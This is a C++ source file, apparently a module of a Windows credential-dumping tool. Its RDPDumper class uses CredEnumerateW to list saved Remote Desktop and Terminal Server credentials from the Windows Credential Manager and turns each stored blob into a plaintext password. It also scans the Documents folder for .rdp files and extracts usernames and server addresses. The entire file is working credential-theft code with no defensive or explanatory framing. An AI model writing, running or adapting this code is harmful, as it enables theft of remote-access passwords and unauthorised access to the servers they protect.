#include <windows.h>
#include <wincred.h>
#include <string>
#include <vector>
#include "dumper.h"
#include "obfuscate.h"

#pragma comment(lib, "credui.lib")

// -------------------------------------------------------------------
// RDP credentials dumper using CredEnumerateW
// -------------------------------------------------------------------
class RDPDumper : public Dumper {
private:
    // Parse .rdp files for stored credentials
    std::vector<DumpResult> DumpRDPFiles() {
        std::vector<DumpResult> results;
        
        // Documents folder
        wchar_t docsPath[MAX_PATH];
        HRESULT hr = SHGetFolderPathW(nullptr, CSIDL_PERSONAL, nullptr, 
                                       SHGFP_TYPE_CURRENT, docsPath);
        if (FAILED(hr)) return results;
        
        std::wstring searchPath = std::wstring(docsPath) + L"\\*.rdp";
        
        WIN32_FIND_DATAW findData;
        HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
        if (hFind == INVALID_HANDLE_VALUE) return results;
        
        do {
            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                std::wstring filePath = std::wstring(docsPath) + L"\\" + findData.cFileName;
                
                // Read .rdp file
                std::vector<unsigned char> content;
                if (ReadFileContents(filePath, content)) {
                    std::string text(content.begin(), content.end());
                    std::wstring textW(content.begin(), content.end());
                    
                    std::wstring notes = L"File: ";
                    notes += findData.cFileName;
                    
                    // Extract username if exists
                    std::wstring username;
                    std::wstring fullAddress;
                    
                    // Parse for username
                    size_t uPos = textW.find(L"username:");
                    if (uPos != std::wstring::npos) {
                        size_t uEnd = textW.find(L"\n", uPos);
                        if (uEnd != std::wstring::npos) {
                            username = textW.substr(uPos + 9, uEnd - uPos - 9);
                            // Trim whitespace
                            while (!username.empty() && username[0] == L' ') username.erase(0, 1);
                            while (!username.empty() && username.back() == L' ') username.pop_back();
                            while (!username.empty() && (username.back() == L'\r' || username.back() == L'\n')) username.pop_back();
                        }
                    }
                    
                    // Parse for full address
                    size_t aPos = textW.find(L"full address:");
                    if (aPos != std::wstring::npos) {
                        size_t aEnd = textW.find(L"\n", aPos);
                        if (aEnd != std::wstring::npos) {
                            fullAddress = textW.substr(aPos + 14, aEnd - aPos - 14);
                            while (!fullAddress.empty() && fullAddress[0] == L' ') fullAddress.erase(0, 1);
                            while (!fullAddress.empty() && fullAddress.back() == L' ') fullAddress.pop_back();
                            while (!fullAddress.empty() && (fullAddress.back() == L'\r' || fullAddress.back() == L'\n')) fullAddress.pop_back();
                        }
                    }
                    
                    results.emplace_back(
                        L"RDP File",
                        username,
                        L"",
                        fullAddress,
                        notes
                    );
                }
            }
        } while (FindNextFileW(hFind, &findData));
        
        FindClose(hFind);
        return results;
    }
    
public:
    virtual const wchar_t* Name() const override {
        return L"RDP";
    }
    
    virtual std::vector<DumpResult> Dump() override {
        std::vector<DumpResult> results;
        
        // Enumerate credential manager entries for RDP
        PCREDENTIALW* pCredentials = nullptr;
        DWORD count = 0;
        
        BOOL ok = CredEnumerateW(L"TERMSRV/*", 0, &count, &pCredentials);
        if (ok && pCredentials && count > 0) {
            for (DWORD i = 0; i < count; ++i) {
                PCREDENTIALW cred = pCredentials[i];
                if (!cred) continue;
                
                std::wstring targetName(cred->TargetName);
                std::wstring userName(cred->UserName);
                std::wstring password;
                
                if (cred->CredentialBlob && cred->CredentialBlobSize > 0) {
                    // Password is stored as Unicode string
                    DWORD pwLen = cred->CredentialBlobSize / sizeof(wchar_t);
                    if (pwLen > 0) {
                        password.assign(reinterpret_cast<wchar_t*>(cred->CredentialBlob),
                                        pwLen);
                        // Remove trailing nulls
                        while (!password.empty() && password.back() == L'\0')
                            password.pop_back();
                    }
                }
                
                // Extract server from target name (TERMSRV/ServerName)
                std::wstring server;
                size_t slashPos = targetName.find(L'/');
                if (slashPos != std::wstring::npos) {
                    server = targetName.substr(slashPos + 1);
                }
                
                std::wstring notes = L"Type: RDP Saved Credential";
                
                results.emplace_back(
                    L"RDP",
                    userName,
                    password,
                    server,
                    notes
                );
            }
            
            CredFree(pCredentials);
        }
        
        // Also try generic Terminal Services credentials
        PCREDENTIALW* pTermCreds = nullptr;
        DWORD termCount = 0;
        
        ok = CredEnumerateW(L"TERMINALSERVER/*", 0, &termCount, &pTermCreds);
        if (ok && pTermCreds && termCount > 0) {
            for (DWORD i = 0; i < termCount; ++i) {
                PCREDENTIALW cred = pTermCreds[i];
                if (!cred) continue;
                
                std::wstring targetName(cred->TargetName);
                std::wstring userName(cred->UserName);
                std::wstring password;
                
                if (cred->CredentialBlob && cred->CredentialBlobSize > 0) {
                    DWORD pwLen = cred->CredentialBlobSize / sizeof(wchar_t);
                    if (pwLen > 0) {
                        password.assign(reinterpret_cast<wchar_t*>(cred->CredentialBlob),
                                        pwLen);
                        while (!password.empty() && password.back() == L'\0')
                            password.pop_back();
                    }
                }
                
                std::wstring server;
                size_t slashPos = targetName.find(L'/');
                if (slashPos != std::wstring::npos) {
                    server = targetName.substr(slashPos + 1);
                }
                
                std::wstring notes = L"Type: TerminalServer Credential";
                
                results.emplace_back(
                    L"RDP",
                    userName,
                    password,
                    server,
                    notes
                );
            }
            
            CredFree(pTermCreds);
        }
        
        // Also dump .rdp files for metadata
        auto fileResults = DumpRDPFiles();
        results.insert(results.end(), fileResults.begin(), fileResults.end());
        
        return results;
    }
};
